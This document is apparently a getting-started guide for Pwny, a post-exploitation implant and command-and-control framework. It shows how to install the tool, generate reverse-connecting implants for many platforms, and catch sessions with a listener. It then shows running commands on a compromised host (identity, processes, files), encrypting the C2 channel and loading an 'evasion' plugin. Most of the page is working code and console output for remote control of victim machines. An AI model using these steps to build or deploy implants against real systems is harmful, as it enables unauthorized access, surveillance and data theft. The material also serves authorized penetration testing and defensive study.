# Getting Started

This guide covers installing Pwny, generating payloads, catching sessions, and running your first commands.

---

## Installation

### Via HatSploit (Recommended)

Installing HatSploit automatically includes Pwny:

```bash
pip3 install git+https://github.com/EntySec/HatSploit
```

### Standalone

```bash
pip3 install git+https://github.com/EntySec/Pwny
```

### Dependencies

- Python >= 3.7
- [Pex](https://github.com/EntySec/Pex) — protocol/utility library (installed automatically)
- `pycryptodome` — encryption support
- `pyaudio` — microphone streaming (optional, for `mic` command)

---

## Generating a Payload

Pwny ships with pre-compiled implant templates for every supported platform and architecture. Generate a payload using the Python API:

```python
from pwny import Pwny

pwny = Pwny(
    target='x86_64-w64-mingw32',
    options={
        'uri': 'tcp://192.168.1.10:8888'
    }
)

# Write EXE
with open('implant.exe', 'wb') as f:
    f.write(pwny.to_binary())
```

### Supported Targets

| Platform | Target Triple | Output |
|----------|--------------|--------|
| Windows x64 | `x86_64-w64-mingw32` | `.exe` |
| Windows x86 | `x86_64-w64-mingw32` | `.exe` |
| Linux x64 | `x86_64-linux-musl` | Static-PIE ELF |
| Linux aarch64 | `aarch64-linux-musl` | Static-PIE ELF |
| Linux armv5 | `armv5l-linux-musleabi` | Static-PIE ELF |
| Linux i486 | `i486-linux-musl` | Static-PIE ELF |
| Linux MIPS | `mips-linux-muslsf` | Static-PIE ELF |
| Linux MIPS LE | `mipsel-linux-muslsf` | Static-PIE ELF |
| Linux MIPS64 | `mips64-linux-musl` | Static-PIE ELF |
| Linux PPC | `powerpc-linux-muslsf` | Static-PIE ELF |
| Linux PPC64LE | `powerpc64le-linux-musl` | Static-PIE ELF |
| Linux s390x | `s390x-linux-musl` | Static-PIE ELF |
| macOS x64 | `x86_64-apple-darwin` | Mach-O |
| macOS aarch64 | `aarch64-apple-darwin` | Mach-O |
| iOS arm | `arm-iphone-darwin` | Mach-O |
| iOS aarch64 | `aarch64-iphone-darwin` | Mach-O |

### Connection URIs

The `uri` option specifies how the implant connects back:

| Scheme | Example | Description |
|--------|---------|-------------|
| `tcp://` | `tcp://192.168.1.10:8888` | Raw TCP reverse connection |
| `http://` | `http://192.168.1.10:8080/callback` | HTTP-based C2 channel |

---

## Catching a Session

### Standalone Listener

The simplest way to test is with the included TCP listener:

```bash
python3 examples/tcp_server.py 0.0.0.0 8888 windows x64
```

```
Waiting for connection ...
```

Once the implant connects, you're dropped into the Pwny console:

```
     cOKxc
    .0K0kWc         Name: Windows 10 Pro
    .x,':Nd       Kernel: 10.0.19045
   .l... ,Wk.       Time: Mon Mar 17 14:22:15 2026
  .0.     ,NN,    Vendor: Microsoft
 .K;       0N0      Arch: x86_64
..'cl.    'xO:    Memory: 4.2 GB/16.0 GB
,''';c'':Oc',,.     UUID: a1b2c3d4-e5f6-7890-abcd-ef1234567890
  ..'.  ..,,.    Commands: 38
                  Plugins: 0

pwny:/C/Users/target$
```

### HatSploit Integration

Within HatSploit, Pwny sessions are created automatically when a Pwny payload connects. Use `sessions -l` to list active sessions and `sessions -i <id>` to interact.

### Programmatic Usage

```python
import socket
from pwny.session import PwnySession

sock = socket.socket()
sock.bind(('0.0.0.0', 8888))
sock.listen()
conn, addr = sock.accept()

session = PwnySession()
session.info['Platform'] = 'windows'
session.info['Arch'] = 'x64'
session.open(conn)

# Execute commands programmatically
output = session.console.pwny_exec('whoami')
print(output)

# Or drop into interactive console
session.interact()
```

---

## First Commands

Once inside the Pwny console, try these:

```
pwny:/C/Users/target$ sysinfo
```

Displays OS name, version, architecture, memory usage, and UUID.

```
pwny:/C/Users/target$ whoami
target\Administrator
```

```
pwny:/C/Users/target$ pwd
C:\Users\target
```

```
pwny:/C/Users/target$ ps
Process List
============

 PID   CPU  Name                Path
 ---   ---  ----                ----
 0     -    System Idle Process -
 4     -    System              -
 648   -    svchost.exe         C:\Windows\System32\svchost.exe
 1024  -    explorer.exe        C:\Windows\explorer.exe
 ...
```

```
pwny:/C/Users/target$ list
Listing: .
=========

 Mode        Size    Type     Modified             Name
 ----        ----    ----     --------             ----
 drwxr-xr-x  0 B    dir      2026-03-15 10:30:00  Desktop
 drwxr-xr-x  0 B    dir      2026-03-14 08:15:00  Documents
 -rw-r--r--  1.2 KB file     2026-03-17 14:00:00  notes.txt
 ...
```

---

## Securing the Channel

By default, the C2 channel is unencrypted. Enable encryption:

```
pwny:/C/Users/target$ secure
[*] Securing communication with AES256-CBC...
[+] Communication secured.
```

Or choose an algorithm:

```
pwny:/C/Users/target$ secure -a chacha20
[*] Securing communication with ChaCha20...
[+] Communication secured.
```

To disable encryption:

```
pwny:/C/Users/target$ unsecure
[*] Unsecuring communication...
[+] Communication unsecured.
```

---

## Loading Plugins

Plugins extend Pwny with additional commands. Load a plugin by name:

```
pwny:/C/Users/target$ load evasion
[*] Loading evasion...
[+] Plugin evasion loaded.
```

Loaded plugins register new commands in the console. See `help` after loading to view them.

---

## Next Steps

- [Console Features](console.md) — prompt customization, environment variables, banners
- [Commands Reference](commands.md) — complete list of all cross-platform commands
- [Plugin Development](plugin-development.md) — write your own plugins
- Platform-specific guides: [Windows](windows/), [Linux](linux/), [macOS](macos/), [iOS](ios/)
